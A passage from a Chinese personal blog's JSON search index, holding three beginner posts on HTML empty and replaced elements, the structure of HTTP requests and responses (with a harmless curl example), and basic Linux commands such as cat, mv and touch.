在我们使用的标签中，有的具有闭合标签。例如\u0026lt;td\u0026gt;标签，它有闭合标签\u0026lt;/td\u0026gt;。但是也有一部分标签没有闭合标签，例如\u0026lt;br /\u0026gt;标签，这一类标签我们称之为空标签。\n常见的空标签有哪些 什么是可替换标签 在 CSS 中，可替换元素（replaced element）的展现效果不是由 CSS 来控制的。这些元素是一种外部对象，它们外观的渲染，是独立于 CSS 的。\n简单来说，它们的内容不受当前文档的样式的影响。CSS 可以影响可替换元素的位置，但不会影响到可替换元素自身的内容。某些可替换元素，例如\u0026lt;iframe\u0026gt;元素，可能具有自己的样式表，但它们不会继承父文档的样式。\nCSS 能对可替换元素产生的唯一影响在于，部分属性支持控制元素内容在其框中的位置或定位方式。有关详细信息，请参阅本文下面的控制内容框中的对象位置。\n可替换标签 典型的可替换元素有：\n\u0026lt;iframe\u0026gt; \u0026lt;video\u0026gt; \u0026lt;embed\u0026gt; \u0026lt;img\u0026gt; 有些元素仅在特定情况下被作为可替换元素处理，例如：\n\u0026lt;option\u0026gt; \u0026lt;audio\u0026gt; \u0026lt;canvas\u0026gt; \u0026lt;object\u0026gt; \u0026lt;applet\u0026gt; HTML 规范也说了 \u0026lt;input\u0026gt; 元素可替换，因为 \u0026ldquo;image\u0026rdquo; 类型的 \u0026lt;input\u0026gt;元素就像\u0026lt;img\u0026gt;一样被替换。但是其他形式的控制元素，包括其他类型的 \u0026lt;input\u0026gt; 元素，被明确地列为非可替换元素（non-replaced elements）。该规范用术语小挂件（Widgets）来描述它们默认的限定平台的渲染行为。\n用 CSS content 属性插入的对象是匿名的可替换元素。它们并不存在于 HTML 标记中，因此是“匿名的”。\nCSS与可替换标签 CSS 在某些情况下会对可替换元素做一些特殊处理，比如计算外边距（margin）和一些 auto 的具体值。\n需要注意的是，一部分（并非全部）可替换元素，其本身具有的尺寸和基线（baseline）会被一些 CSS 属性用到，加入计算之中，例如 vertical-align。会只有可替换元素才能具有这种自带值。\n控制内容框中的对象位置节 某些CSS属性可用于指定被替换元素中包含的对象应如何定位在元素的框区域中。这些由CSS图像模块第3级和CSS图像模块第4级规范定义:\nobject-fit 指定应如何将替换后的元素的内容对象安装到包含元素的框中。\n对象的位置 指定被替换元素的内容对象在元素框中的对齐方式。\n","date":"2019-03-16T20:13:36+08:00","permalink":"http://808Mak1r.github.io/p/html%E7%AE%80%E4%BB%8B/","title":"HTML简介"},{"content":"HTTP请求的格式 1 动词 路径 协议/版本 2 Key1: value1 2 Content-Type: application/x-www-form-urlencoded 2 Host: www.baidu.com 2 User-Agent: curl/7.54.0 3 4 要上传的数据 请求最多包含四部分，最少包含三部分。（也就是说第四部分可以为空） 第三部分永远都是一个回车（\\n）\n当浏览器向Web服务器发出请求时，它向服务器传递了一个数据块，也就是请求信息，HTTP请求信息由3部分组成：（1）请求方法URI协议/版本（2）　请求头(Request Header)（3）　请求正文 （1）请求方法URI协议/版本 请求的第一行是“方法URI协议/版本”例如：GET/sample.jsp HTTP/1.1 以上代码中“GET”代表请求方法，“/sample.jsp”表示URI，“HTTP/1.1代表协议和协议的版本。 （2）请求头(Request Header) 请求头包含许多有关的客户端环境和请求正文的有用信息。例如，请求头可以声明浏览器所用的语言，请求正文的长度等。例如： Accept:image/gif.image/jpeg./ Accept-Language:zh-cn Connection:Keep-Alive Host:localhost User-Agent:Mozila/4.0(compatible:MSIE5.01:Windows NT5.0) Accept-Encoding:gzip,deflate. （3）请求正文 请求头和请求正文之间是一个空行，这个行非常重要，它表示请求头已经结束，接下来的是请求正文。请求正文中可以包含客户提交的查询字符串信息： username=jinqiao\u0026amp;password=1234\n用Chrome查看请求 1.打开检查，进入Network 2.在地址栏输入网址 3.在 Network 点击，查看 request，点击「view source」 4.如果有请求的第四部分，那么在 FormData 或 Payload 里面可以看到\nHTTP响应 请求了之后，应该都能得到一个响应，除非断网了，或者服务器宕机了。\n1.GET 请求和 POST 请求对应的响应可以一样，也可以不一样 2.响应的第四部分可以很长很长很长\n响应的格式 1 协议/版本号 状态码 状态解释 2 Key1: value1 2 Key2: value2 2 Content-Length: 17931 2 Content-Type: text/html 3 4 要下载的内容\n用Chrome查看响应 1.打开 Network 2.输入网址 3.选中第一个响应 4.查看 Response Headers，点击「view source」，点击「view source」，点击「view source」 5.你会看到响应的前两部分 6.查看 Response 或者 Preview，你会看到响应的第 4 部分\n使用 curl 命令 进入命令行界面\ncurl -s -v -H \u0026#34;Frank: xxx\u0026#34; -- \u0026#34;https://www.baidu.com\u0026#34; 以上是用Git Bash查看请求与响应的命令 会得到相关内容\n","date":"2019-03-15T16:42:06+08:00","permalink":"http://808Mak1r.github.io/p/%E5%85%B3%E4%BA%8Ehttp%E7%9A%84%E8%AF%B7%E6%B1%82%E4%B8%8E%E7%9B%B8%E5%BA%94/","title":"关于HTTP的请求与相应"},{"content":"ls 查看路径\ncat 1.一次显示整个文件。 $ cat filename 2.从键盘创建一个文件。 $ cat \u0026gt; filename 只能创建新文件,不能编辑已有文件. 3.将几个文件合并为一个文件。 $cat file1 file2 \u0026gt; file\nmv mv命令是move的缩写，可以用来移动文件或者将文件改名（move (rename) files），是Linux系统下常用的命令，经常用来备份文件或者目录\ntouch 1.是用于把已存在文件的时间标签更新为系统当前的时间（默认方式），它们的数据将原封不动地保留下来； 2.是用来创建新的空文件\nexplainshell.com 这个网站是用来查找自己不懂得命令行的相关释义 ","date":"2019-03-14T12:46:03+08:00","permalink":"http://808Mak1r.github.io/p/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9B%B8%E5%85%B3/","title":"命令行相关"}]